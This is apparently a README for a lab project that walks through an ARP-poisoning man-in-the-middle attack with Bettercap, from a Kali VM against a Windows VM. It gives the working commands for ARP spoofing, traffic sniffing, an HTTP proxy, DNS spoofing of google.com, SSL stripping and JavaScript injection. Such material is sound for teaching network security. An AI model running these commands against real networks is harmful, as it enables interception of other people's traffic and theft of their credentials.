# ARPple

ARPple is a lab project for performing a poisoned ARP attack using Bettercap.

## Overview

- Use a Kali Linux attacker VM and a Windows victim VM on the same network.
- Enable IPv4 forwarding on the attacker.
- Use Bettercap to discover hosts, spoof ARP, sniff traffic, and optionally proxy HTTP.
- Optionally perform DNS spoofing for additional traffic redirection.

## Prerequisites

- Kali Linux attacker VM with `bettercap` installed.
- Windows victim VM connected to the same network as Kali.
- Network connectivity between the two VMs.

## Basic workflow

1. Verify the environment:
   - On Kali: `ip route`
   - On Windows: `ping google.com`
   - Confirm both VMs can ping each other.

2. Enable packet forwarding on Kali:
   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   ```

3. Start Bettercap:
   ```bash
   sudo bettercap -iface eth0
   ```

4. Discover the target host:
   ```text
   net.probe on
   net.show
   ```

5. Start ARP spoofing:
   ```text
   set arp.spoof.targets <Victim IP>
   arp.spoof on
   ```

6. Start traffic capture and proxy:
   ```text
   net.sniff on
   http.proxy on
   ```

7. Stop the attack and cleanup:
   ```text
   arp.spoof off
   http.proxy off
   exit
   sudo sysctl -w net.ipv4.ip_forward=0
   ```

## DNS spoofing

Inside Bettercap:

```text
set arp.spoof.targets <Victim IP>
arp.spoof on
net.probe on
net.recon on
set dns.spoof.domains google.com
set dns.spoof.address <spoofed IP>
dns.spoof on
set http.proxy.sslstrip true
set http.proxy.injectjs alert('You have been pwned!')
http.proxy on
net.sniff on
```

## Notes

- Replace `<Victim IP>` with the Windows VM IP address.
- Use Wireshark or the Bettercap logs to inspect captured traffic.
- Disable forwarding after the lab to restore normal network behavior.
